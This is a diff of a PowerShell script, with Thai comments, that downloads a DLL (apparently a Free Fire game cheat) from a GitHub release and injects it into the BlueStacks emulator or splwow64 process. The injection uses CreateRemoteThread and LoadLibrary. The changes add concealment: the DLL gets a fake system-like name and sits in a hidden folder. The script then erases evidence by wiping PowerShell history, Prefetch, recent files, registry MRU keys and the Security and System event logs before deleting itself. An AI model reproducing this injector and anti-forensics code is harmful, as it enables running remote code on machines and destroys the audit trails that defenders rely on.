@@ -18,7 +18,12 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
-# === 2. Fixed LookupFunc ===
+# === 2. กำหนดค่าพื้นฐาน ===
+$fakeName = "mscories.dll"
+$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
+$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+
+# === 3. Fixed LookupFunc ===
 function LookupFunc {
     Param ($moduleName, $functionName)
     
@@ -67,7 +72,7 @@ function getDelegateType {
     return $type.CreateType()
 }
 
-# === 3. Clear Temp Folder ===
+# === 4. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
 try {
@@ -78,13 +83,14 @@ catch {
     Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
 }
 
-# === 4. Download DLL to %TEMP% with Random Name ===
-$randomGuid = [System.Guid]::NewGuid().ToString()
-$dllFileName = "$randomGuid.tmp"
-$dllPath = Join-Path $env:TEMP $dllFileName
+# === 5. สร้างโฟลเดอร์ทำงานและดาวน์โหลด DLL ===
+# สร้างโฟลเดอร์และซ่อน
+if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+attrib +h +s $workDir
 
-# เลือก URL ที่ต้องการ (แก้ไขตามความเหมาะสม)
-$dllUrl = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+# กำหนด path ของ DLL โดยใช้ $fakeName
+$dllPath = Join-Path $workDir $fakeName
 
 try {
     $webClient = New-Object System.Net.WebClient
@@ -92,7 +98,9 @@ try {
     $webClient.Dispose()
     
     if (Test-Path $dllPath) {
-        Write-Host "[+] Download successful." -ForegroundColor Green
+        Write-Host "[+] Download successful: $dllPath" -ForegroundColor Green
+        # ซ่อนไฟล์ DLL
+        attrib +h $dllPath
     } else {
         throw "File not found after download."
     }
@@ -102,7 +110,7 @@ catch {
     exit 1
 }
 
-# === 5. กำหนดเป้าหมายกระบวนการ (ลองหลายตัว) ===
+# === 6. กำหนดเป้าหมายกระบวนการ (ลองหลายตัว) ===
 $targetProcesses = @(
     @{ Name = "HD-Player"; Path = "C:\Program Files\BlueStacks_nxt\HD-Player.exe" },
     @{ Name = "splwow64"; Path = "splwow64.exe" },
@@ -171,7 +179,7 @@ if (-not $proc) {
 $pid1 = $proc.Id
 Write-Host "[+] Target: $targetName (PID: $pid1) [Admin Context]" -ForegroundColor Green
 
-# === 6. Injection ===
+# === 7. Injection ===
 try {
     $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc kernel32.dll OpenProcess),
@@ -232,7 +240,7 @@ try {
     $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
     
     if ($hThread -ne [IntPtr]::Zero) {
-        Write-Host "[✓] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
+        Write-Host "[+] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
     } else {
         Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
     }
@@ -242,23 +250,23 @@ catch {
     Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
 }
 
-# === 7. Enhanced Cleanup & Anti-Forensics ===
+# === 8. Enhanced Cleanup & Anti-Forensics ===
 Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan
 
-# 7.1 Clear PowerShell History
+# 8.1 Clear PowerShell History
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { 
     try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
 }
 
-# 7.2 Clear Recent Files
+# 8.2 Clear Recent Files
 $recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
 if (Test-Path $recentPath) {
     Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
 }
 
-# 7.3 Clear Jump Lists
+# 8.3 Clear Jump Lists
 $jumpListPaths = @(
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
     (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
@@ -269,25 +277,28 @@ foreach ($path in $jumpListPaths) {
     }
 }
 
-# 7.4 Clear Prefetch
+# 8.4 Clear Prefetch (ลบไฟล์ .pf ที่เกี่ยวข้อง)
 $prefetchPath = "C:\Windows\Prefetch"
 for ($i = 0; $i -lt 3; $i++) {
     Start-Sleep -Seconds 1
     if (Test-Path $prefetchPath) {
-        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        # ลบ prefetch ของ HD-Player, splwow64, และ DLL
+        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | 
+            Where-Object { $_.Name -like "*HD-PLAYER*" -or $_.Name -like "*SPLWOW64*" -or $_.Name -like "*MSCORIES*" } |
+            Remove-Item -Force -ErrorAction SilentlyContinue
     }
 }
 
-# 7.5 Clear INetCache
+# 8.5 Clear INetCache
 $ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
 if (Test-Path $ieCache) {
     Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# 7.6 Clear Temp Again
+# 8.6 Clear Temp Again
 Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 
-# 7.7 Clear Registry MRU Keys
+# 8.7 Clear Registry MRU Keys และ MuiCache
 $mruKeys = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
     "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
@@ -296,9 +307,9 @@ $mruKeys = @(
 )
 foreach ($key in $mruKeys) {
     if (Test-Path $key) {
-        # ลบเฉพาะค่าใน MuiCache ที่มีชื่อ DLL
         if ($key -like "*MuiCache*") {
-            Get-Item -Path $key -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$dllFileName*" -or $_ -like "*.tmp*" } | ForEach-Object {
+            # ลบค่า MuiCache ที่เกี่ยวข้องกับ $fakeName
+            Get-Item -Path $key -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" -or $_ -like "*.tmp*" } | ForEach-Object {
                 Remove-ItemProperty -Path $key -Name $_ -Force -ErrorAction SilentlyContinue
             }
         } else {
@@ -308,7 +319,7 @@ foreach ($key in $mruKeys) {
     }
 }
 
-# 7.8 Clear Event Logs
+# 8.8 Clear Event Logs
 $logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational")
 foreach ($logName in $logNames) {
     try {
@@ -316,18 +327,24 @@ foreach ($logName in $logNames) {
     } catch {}
 }
 
-# 7.9 Delete DLL
-Start-Sleep -Seconds 1
-if (Test-Path $dllPath) { 
-    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
+# 8.9 Delete DLL และโฟลเดอร์ทำงาน
+Start-Sleep -Seconds 2
+if (Test-Path $workDir) { 
+    try { 
+        Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
+        Write-Host "[+] Removed working directory: $workDir" -ForegroundColor Green
+    } catch {}
 }
 
-# 7.10 Delete script itself
+# 8.10 Clear PowerShell History อีกครั้ง
+Clear-History -ErrorAction SilentlyContinue
+
+# 8.11 Delete script itself
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
     Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
 }
 
-# 7.11 Force GC
+# 8.12 Force GC
 [GC]::Collect()
 Start-Sleep -Seconds 2
 
